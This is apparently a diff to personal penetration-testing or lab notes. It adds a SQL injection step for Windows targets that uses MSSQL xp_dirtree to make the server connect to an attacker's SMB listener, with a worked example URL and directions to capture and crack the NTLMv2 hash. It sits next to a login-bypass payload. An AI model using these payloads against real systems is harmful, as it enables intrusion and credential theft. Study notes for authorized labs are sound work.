@@ -4,6 +4,14 @@
 ' or 1=1 limit 1;-- -
 ```
 - if that succeeds, SQL injection!
+If SQLi on windows target, start `smbserver.py test . -smb2support` and try appending this to URL where `'` goes:
+```
+;%20EXEC%20master..xp_dirtree%20%22\\10.10.14.5\test%22;%20--
+```
+- replace `10.10.14.5` with kali IP
+- ex: `https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=8;%20EXEC%20master..xp_dirtree%20%22\\10.10.14.5\test%22;%20--`
+- catch ntlmv2 hash and crack with john (copy whole thing including username and trailing 00000s)
+
 Google the http-title
 
 `searchsploit service version`
